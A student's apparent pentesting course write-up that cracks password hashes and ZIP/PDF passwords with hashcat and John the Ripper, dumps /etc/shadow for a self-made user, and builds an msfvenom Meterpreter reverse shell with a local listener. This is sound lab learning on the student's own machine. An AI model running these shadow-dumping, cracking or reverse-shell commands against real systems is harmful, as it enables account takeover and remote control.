## Yunwei Cui | Pentesting Course

# h5: Syyskuu2025!

## x. Summaries

### Karvinen 2022: Cracking Passwords with Hashcat

In this writeup, we learn how to crack passwords using hashcat:

First we must install hashcat:
`sudo apt-get update` 
`sudo apt-get -y install hashid hashcat wget`

We will then install a common password list text file using:
`wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz`

We can unpack it using `tar xf rockyou.txt.tar.gz`

now we have rockyou.txt

We can now start cracking passwords. First we can turn any word into a hashed password: `echo -n 'jessica'|md5sum` and this would turn it into an MD5 hash `aae039d6aa239cfc121357a825210fa3  -`
Notice we have the dash that we have to remove but now we can analyze the hash:

`hashid -m 6b1628b016dff46e6fa35684be6acc96`
This will show us what hash it matches and what we should test for example it shows us it matches MD5, MD4

`hashcat -m 0 '6b1628b016dff46e6fa35684be6acc96' rockyou.txt -o solved`

the `-m` flag determines what type of hash it is so 0 means MD5. The `-o solved` saves the solved solution as plain text into a text file.


### Karvinen 2023: Crack File Password With John

First we must install a few libraries for John the ripper:

`sudo apt-get -y install micro bash-completion git build-essential libssl-dev zlib1g zlib1g-dev zlib-gst libbz2-1.0 libbz2-dev atool zip wget`

i got an error stating that: E: Unable to locate package zlib-gst so I removed it and tried again.

These are basically different libraries for John to do other tasks such as ZIP support and C compiler etc.

Now we must download John: 
`git clone --depth=1 https://github.com/openwall/john.git`

and configure it:
`cd john/src/`
`./configure`

if I am missing anything, it will tell me to install those first. I had some libraries missing but I dont think they will be important so I will just install John: 
`make -s clean && make -sj4`

It took a couple minutes. It has now created a new folder in the /john directory called /run. In there, we have different .py scripts. We simply type `john` in the run directory and it will start.

<img src=h5.1.png alt="img"/>

Next up, we download an example password protected ZIP file: `wget https://TeroKarvinen.com/2023/crack-file-password-with-john/tero.zip`

when trying to unzip it, we get prompted with a password:
<img src=h5.2.png alt="img"/>

Now we must first analyze the hash into a new file using `$HOME/john/run/zip2john tero.zip > tero.zip.hash`

Now we can run a dictionary attack against the hash: `$HOME/john/run/john tero.zip.hash`
<img src=h5.3.png alt="img"/>

Now we can use the password which is `butterfly` to extract the ZIP.


### Santos et al 2017: Security Penetration Testing - The Art of Hacking Series LiveLessons:

- Talked about eternal blue exploit, dump credentials using mimicat, used the credentials to attack other system on the same network
- Low hanging fruit: common passwords, default passwords
- You can sniff for passwords on public networks and do MITM or bruteforce
- Encryption hashing => you can turn a word into a hash that is encrypted
- Passwords are easy to crack because of non-ecryption, rainbow tables, weak algorithms and people tend to reuse passwords, GPU speed up
- Cracking passwords using tools such as John the ripper and you an analyze the password and use it to crack it and also it saves the ones it has cracked
- Cracking password with Hashcat using bruteforce or wordlist with GPU acceleration and has a lot of options
- Companies should enforce longer passwords


## a. Hashcat Example

First we turn a word into an MD5 sum using `echo -n "john"|md5sum`

We use -n to remove new line. This will give us the hash of just `john`

Then we can use the hash that we get: <img src=h5.4.png alt="img"/>

`527bd5b5d689e2c32ae974c6229ff785`

We can now copy the hash and crack it using Hashcat. First we see what hash it is using `hashid -m`

<img src=h5.5.png alt="img"/>
We can see the potential hash types it is, but we already know it is MD5 so we will use:

`hashcat -m 0 '527bd5b5d689e2c32ae974c6229ff785' wordlist.txt --show`

<img src=h5.6.png alt="img"/>

Now it shows the password is `john`


## b. Using John the Ripper
<img src=h5.7.png alt="img"/>

First we are making a text file. Now we add it into a password protected ZIP.

`zip -e archive.zip file.txt` will turn it into an encrypted archive.zip

<img src=h5.8.png alt="img"/>

The password is `123456`

Now we will turn it into a hash using John the Ripper. `$HOME/john/run/zip2john archive.zip > archive.zip.hash`

Then we will run an attack against it: `$HOME/john/run/john archive.zip.hash`

<img src=h5.9.png alt="img"/>
We can see the cracked password here.


## c. File cracking
For this exercise, I will be breaking a password protected PDF. The password for the PDF will be `lololo` and I will bruteforce it

I am going to use my own PDF that I encrypted on my desktop. I'm using a video by CybrZone and their video as a documentation on how to do this. 
<img src=h5.10.png alt="img"/>

So we run `pdf2john protected.pdf > pdf.hash` to turn the protected.pdf into a hash that we can crack.

Then we run `john pdf.hash` and we can get the hash by bruteforce.

<img src=h5.11.png alt="img"/>

Took around 14 seconds.

## d. Hash cracking

Getting a password hash from the internet or making my own one, such as a linux user and then cracking that.

I will make a linux user using `sudo useradd -m testuser` and `sudo passwd testuser` after which I will input my password which is `crazy`

This user hash is now stored in etc/shadow which is only readable in sudo mode according to Conda on YouTube

I will now copy the hashes from etc/shadow using: 

`cp /etc/shadow shadow.txt`


We must then convert them into readable formats for John using `unshadow shadow.txt passwd.txt`

<img src=h5.12.png alt="img"/>

Now we can use john after we save it into a textfile `sudo unshadow shadow.txt > johny`

Now we match the hashes from a wordlist with the hashes in the shadow.txt:

`john --wordlist=rockyou.txt --format=yescrypt johny`

At this point I find out that I did something wrong and I read a writeup from my classmate `Mireabdi` and tried starting over.

`sudo useradd -m testuser2`
`sudo passwd testuser2`

The password is "jessica"

`sudo grep testuser2 /etc/shadow > ~/testuser2.hash`

<img src=h5.13.png alt="img"/>

Now I will use a wordlist to break the hash
`./john --wordlist=$HOME/rockyou.txt testuser2.hash`

We have to run this inside john/run folder with the hash or otherwise we get zsh: permission denied.

<img src=h5.14.png alt="img"/>

We have cracked the password

## e. msfvenom reverse shell

We will try make a reverse shell using msfvenom. We need to select a reverse shell payload and I will try to run it on my local machine:

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o reverse_shell.elf`

<img src=h5.15.png alt="img"/>

We use the shell_reverse_tcp payload 

`LOST=127.0.0.1` is the attacking machine IP that will receive the connection

`LPORT=4444` is the port that will receive the connection

`-f elf` is an executable format

We will then `chmod +x reverse_shell.elf` to turn it into an executable

<img src=h5.17.png alt="img"/>

Now we will open `msfconsole` and run the listener.

`use exploit/multi/handler`

I struggled a bit to find the right payload that I made which was
`set payload linux/x86/meterpreter/reverse_tcp`

<img src=h5.18.png alt="img"/>

`set LHOST localhost`

`set LPORT 4443`

`run -j`

Now we can run the malware with `./reverse_shell.elf`

Now we should see a session open up on msfconsole

<img src=h5.19.png alt="img"/>

We can ctrl + c and go back and `sessions` and we can get a meterpreter by selecting the correct session `sessions 1`

We can do commands like a normal user can now using meterpreter

NOTE: for some reason payload `linux/x86/meterpreter/reverse_tcp` worked but the single stage `linux/x86/meterpreter_reverse_tcp` did not work. It closes the sessiosn immediately when I try to exploit regardless if I run the malware executable or not on the other terminal.

References:
https://terokarvinen.com/tunkeutumistestaus/

https://terokarvinen.com/2022/cracking-passwords-with-hashcat/

https://terokarvinen.com/2023/crack-file-password-with-john/

O'Reilly: https://learning.oreilly.com/videos/security-penetration-testing/9780134833989/9780134833989-sptt_00_06_01_00/

https://www.nitttrchd.ac.in/imee/Labmanuals/Penetration%20Testing%20of%20Password%20Protected%20Documents.pdf

CybrZone
https://www.youtube.com/watch?v=-AnQ2GAbFUY

Conda
https://www.youtube.com/watch?v=X1Yl_StL1ac

https://github.com/Mireabdi/Tunkeutumistestaus/blob/main/H5/H5.md